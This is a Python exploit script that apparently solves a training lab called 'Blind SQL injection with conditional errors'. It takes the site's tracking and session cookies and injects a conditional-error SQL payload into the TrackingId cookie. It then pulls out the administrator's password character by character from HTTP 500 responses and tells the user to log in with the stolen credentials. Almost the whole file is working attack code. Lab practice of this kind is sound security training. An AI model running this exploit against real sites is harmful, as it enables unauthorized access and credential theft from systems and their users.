import sys
import requests
import urllib3
import urllib.parse
import string

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "Blind SQL injection with conditional errors"
CHARSET = string.ascii_lowercase + string.digits


def sqli_password(url, proxies=None):
    session = requests.Session()
    session.proxies = proxies or {}
    session.verify = False

    print("[+] Fetching initial session and tracking ID...")
    r = session.get(url)
    cookies = session.cookies.get_dict()
    tracking_id = cookies.get("TrackingId")
    session_id = cookies.get("session")

    if not tracking_id or not session_id:
        print("[-] Failed to retrieve cookies.")
        return False

    print(f"[+] TrackingId: {tracking_id}")
    print(f"[+] Session: {session_id}")

    extracted_password = ""
    print("[+] Extracting administrator password:")

    for i in range(1, 21):
        found = False
        for c in CHARSET:
            payload = (
                f"' || (SELECT CASE WHEN SUBSTR(password,{i},1)='{c}' "
                f"THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '"
            )
            full_tracking_id = tracking_id + urllib.parse.quote(payload)

            cookies = {
                "TrackingId": full_tracking_id,
                "session": session_id
            }

            res = session.get(url, cookies=cookies)
            if res.status_code == 500:
                extracted_password += c
                sys.stdout.write("\r" + extracted_password)
                sys.stdout.flush()
                found = True
                break
        if not found:
            break

    print("\n[+] Extraction complete.")
    print(f"[+] Administrator password: {extracted_password}")
    print("[+] Login with above creds!")
    return True


def run(url, payload=None, proxies=None):
    print("[+] Starting SQL injection with conditional errors...")
    success = sqli_password(url, proxies)
    if success:
        print("[+] Login with above creds!")
        return True
    else:
        print("[-] Lab exploit failed.")
        return False
